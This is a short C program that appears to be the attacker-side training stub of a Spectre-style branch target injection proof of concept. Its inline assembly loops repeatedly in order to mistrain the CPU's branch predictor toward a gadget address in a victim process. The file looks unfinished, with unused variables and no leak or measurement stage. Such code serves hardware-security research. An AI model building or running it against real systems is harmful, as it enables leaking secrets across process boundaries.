#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>

void __attribute__((section(".fnptr"))) (*fn_ptr)(void);

/*
 * This is the target of the indirect call
 * which we locate at the address of a gadget
 * in the "victim" process we are trying to
 * (mis)train the processor's BTB to call
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {

    asm volatile (
        "pop    %%rax\n"    // clear return from original call

    "target_fn_start:"
        ".rept  32\n"
        "call   1f\n"

         // x 0x19 nops to jump signal without actually affecting cache in inject.
        "nop;nop;nop;nop;nop;nop;nop;nop;\n"
        "nop;nop;nop;nop;nop;nop;nop;nop;\n"
        "nop;nop;nop;nop;nop;nop;nop;nop;\n" 
        "nop;nop;nop;nop;nop;nop;nop;nop;\n" 
        "1:\n"
        "pop    %%rax\n"
        ".endr\n"

        "jmp   target_fn_start\n"
    :::);
}


#define TARGET_FN_ADDR 0x414100401000
uint64_t jmp_ptr;
void *map;

int main(int argc, char *argv[])
{
    fn_ptr = target_fn;
    printf("target_fn = %p\n", target_fn);

    printf("training...\n");

    target_fn();

}
